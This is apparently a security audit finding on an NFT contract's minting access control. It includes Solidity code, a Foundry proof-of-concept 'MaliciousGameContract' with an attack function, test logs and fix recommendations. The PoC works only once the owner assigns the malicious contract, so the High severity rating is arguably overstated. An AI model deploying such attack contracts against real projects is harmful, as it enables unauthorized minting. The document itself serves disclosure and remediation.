# High

## TITLE: Insecure Access Control Allows Arbitrary Minting by Malicious Contracts

## Summary

The `EggstravaganzaNFT` contract assigns minting authority to a single `gameContract` address without validating its behavior. This creates an insecure trust boundary that allows a malicious contract to be assigned and used to arbitrarily mint NFTs.

## Vulnerability Details

The contract uses a single variable, `gameContract`, to determine whether a caller is authorized to mint:

```solidity
function mintEgg(address to, uint256 tokenId) external returns (bool) {
    require(msg.sender == gameContract, "Unauthorized minter");
    _mint(to, tokenId);
    totalSupply += 1;
    return true;
}
```

The `gameContract` address is set by the owner via:

```solidity
function setGameContract(address _gameContract) external onlyOwner {
    require(_gameContract != address(0), "Invalid game contract address");
    gameContract = _gameContract;
}
```

There is no validation that the assigned contract adheres to a specific interface, behaves as expected, or is not malicious. As a result, any attacker who gains access to the owner account — or any mistakenly trusted contract — can be granted minting power.

In our test, we deployed a malicious contract that exposes a public function allowing arbitrary minting. Once this contract is set as `gameContract`, anyone can mint NFTs by calling it.

# PoC

```Solidity
/*//////////////////////////////////////////////////////////////
            PoC: MALICIOUS CONTRACT CAN MINT EGGS
//////////////////////////////////////////////////////////////*/

contract MaliciousGameContract {
    EggstravaganzaNFT public egg;

    constructor(address _egg) {
        egg = EggstravaganzaNFT(_egg);
    }

    function attack(address to, uint256 tokenId) external {
        // Mint an egg to any address
        egg.mintEgg(to, tokenId);
    }
}

/*//////////////////////////////////////////////////////////////
                PoC: TEST MALICIOUS CONTRACT CAN MINT EGGS
//////////////////////////////////////////////////////////////*/

contract EggstravaganzaNFTTest is Test {
    EggstravaganzaNFT public egg;
    MaliciousGameContract public attacker;

    address public owner = address(0xABCD);
    address public victim = address(0xBEEF);

    function setUp() public {
        vm.startPrank(owner);
        egg = new EggstravaganzaNFT("Egg", "EGG");
        vm.stopPrank();
    }

    function test_MaliciousContractCanMintIfWhitelisted() public {
        // Simulate attacker deploying a malicious contract
        vm.startPrank(owner);
        attacker = new MaliciousGameContract(address(egg));

        // Owner sets malicious contract as the authorized game contract
        egg.setGameContract(address(attacker));
        vm.stopPrank();

        // Log total supply before the attack
        console.log("Total supply before attack:", egg.totalSupply());

        // Now anyone can use the malicious contract to mint an egg
        vm.startPrank(address(0xBAD));
        attacker.attack(victim, 999);
        vm.stopPrank();

        // Assert that the egg was minted
        assertEq(egg.ownerOf(999), victim);
        assertEq(egg.totalSupply(), 1);

        // Console logs for proof
        console.log("Malicious game contract deployed at:", address(attacker));
        console.log("Victim address:", victim);
        console.log("Egg owner of tokenId 999:", egg.ownerOf(999));
        console.log("Total supply after attack:", egg.totalSupply());
    }
}
```

***

\[PASS] test\_MaliciousContractCanMintIfWhitelisted() (gas: 376139)

**Logs:**

* Total supply before attack: 0
* Malicious game contract deployed at: 0x2561e2FAEA20b514433C253266d9DA5dDD3E4Cd5
* Victim address: 0x000000000000000000000000000000000000bEEF
* Egg owner of tokenId 999: 0x000000000000000000000000000000000000bEEF
* Total supply after attack: 1

***

## Impact

* Unauthorized NFTs can be minted by untrusted or malicious contracts.
* Total supply can be inflated arbitrarily.
* Trust assumptions around the uniqueness and fairness of the game are broken.
* If NFTs have market value or gameplay significance, this could enable theft, spam, or manipulation.

## Tools Used

* Foundry
* Console logging (via `console.log`)
* Manual inspection and test-based Proof of Code

## Recommendations

* Require the `gameContract` to implement a known interface (e.g., `IGameMinter`) and enforce it via `try/catch` or interface checks.
* Consider restricting minting to a known, immutable game contract — or use access control patterns from OpenZeppelin like `AccessControl`.
